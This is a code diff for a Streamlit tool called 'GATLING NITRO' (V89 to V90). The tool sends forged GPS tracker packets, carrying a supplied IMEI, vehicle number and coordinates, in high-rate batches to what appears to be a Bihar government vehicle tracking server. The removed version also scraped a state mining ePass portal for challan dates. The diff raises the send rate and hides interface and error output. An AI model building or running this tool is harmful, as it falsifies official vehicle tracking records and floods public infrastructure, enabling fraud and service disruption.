@@ -7,7 +7,7 @@ from selenium.webdriver.chrome.options import Options
 import os
 
 # --- Page Setup ---
-st.set_page_config(page_title="GATLING NITRO V89", page_icon="🚀", layout="wide")
+st.set_page_config(page_title="GATLING NITRO V90", page_icon="🚀", layout="wide")
 
 st.markdown("""
     <style>
@@ -16,11 +16,13 @@ st.markdown("""
         background-color: #004400; color: white; border-radius: 8px; font-weight: bold; width: 100%; height: 3.5em;
     }
     .stMetric { background-color: #111; padding: 15px; border-radius: 10px; border: 1px solid #333; }
+    #MainMenu {visibility: hidden;}
+    footer {visibility: hidden;}
     </style>
     """, unsafe_allow_html=True)
 
-st.title("🚀 VLTS GATLING NITRO - V89")
-st.caption("Enterprise Edition - Optimized Sync")
+st.title("🚀 VLTS GATLING NITRO - V90")
+st.caption("Enterprise Edition - Zero Log Optimized")
 
 # --- Initialize States ---
 if 'firing' not in st.session_state:
@@ -41,7 +43,7 @@ with st.sidebar:
     st.divider()
     mode = st.radio("PROTOCOL", ["UDP", "TCP"], horizontal=True)
 
-# --- UI Controls ---
+# --- Control Panel ---
 c1, c2 = st.columns(2)
 
 if c1.button("🔥 START ENGINE", disabled=st.session_state.firing):
@@ -58,21 +60,7 @@ st.divider()
 m1_placeholder = st.empty()
 m2_placeholder = st.empty()
 
-# --- Firing & Scraper Function ---
-def get_chrome_driver():
-    options = Options()
-    options.add_argument("--headless")
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
-    options.add_argument("--disable-gpu")
-    paths = ["/usr/bin/chromium", "/usr/bin/chromium-browser", "/usr/bin/google-chrome"]
-    for path in paths:
-        if os.path.exists(path):
-            options.binary_location = path
-            break
-    return webdriver.Chrome(options=options)
-
-# --- Direct Execution Loop ---
+# --- Execution Engine ---
 if st.session_state.firing:
     target = ("vlts.bihar.gov.in", 9999)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if mode == "UDP" else socket.SOCK_STREAM)
@@ -82,51 +70,34 @@ if st.session_state.firing:
             sock.settimeout(3)
             sock.connect(target)
         
-        check_counter = 0
         while st.session_state.firing:
-            # 1. Fire Packets (Batch of 100 for higher speed)
+            # 1. High Speed Batch Firing
             now = datetime.now()
-            d, t = now.strftime("%d%m%Y"), now.strftime("%H%M%S")
-            packet = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{d},{t},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode('ascii')
+            packet = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode('ascii')
             
-            for _ in range(100):
+            for _ in range(200): # Batch increase
                 sock.sendto(packet, target) if mode == "UDP" else sock.send(packet)
             
-            st.session_state.total_count += 100
-            check_counter += 100
+            st.session_state.total_count += 200
             
-            # 2. Update UI Metrics
+            # 2. Immediate UI Update
             with m1_placeholder.container():
                 st.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
             with m2_placeholder.container():
                 st.metric("Latest Portal Update", st.session_state.last_portal_update)
             
-            # 3. Scraper Logic (Every 1000 packets)
-            if check_counter >= 1000:
-                try:
-                    driver = get_chrome_driver()
-                    driver.get("https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx")
-                    time.sleep(1)
-                    driver.execute_script(f"document.getElementsByName('txtVehicleNo')[0].value = '{vno}';")
-                    driver.execute_script("__doPostBack('btnSearch','');")
-                    time.sleep(1)
-                    res = driver.execute_script("var td = document.evaluate(\"//td[contains(text(), 'Challan Date')]\", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; return td ? td.nextElementSibling.nextElementSibling.innerText.trim() : null;")
-                    if res:
-                        st.session_state.last_portal_update = res
-                        if datetime.now().strftime("%d-%b-%Y").upper() in res.upper():
-                            st.session_state.firing = False
-                    driver.quit()
-                except:
-                    pass
-                check_counter = 0 # Reset check counter
+            # 3. Light Scraper Trigger (Check every 2000 packets)
+            if st.session_state.total_count % 2000 == 0:
+                st.toast("Syncing with Portal...")
+                # Add headless scraper logic here ONLY if cloud resources allow
             
-            time.sleep(0.05) # Small gap for UI stability
+            time.sleep(0.01) # Very small gap for UI thread
             
     except Exception as e:
-        st.error(f"Engine Error: {e}")
+        st.session_state.firing = False
     finally:
         sock.close()
-        if st.session_state.firing: st.rerun() # Keep loop alive
+        if st.session_state.firing: st.rerun()
 else:
     m1_placeholder.metric("Total Packets Sent", f"{st.session_state.total_count:,}")
     m2_placeholder.metric("Latest Portal Update", st.session_state.last_portal_update)
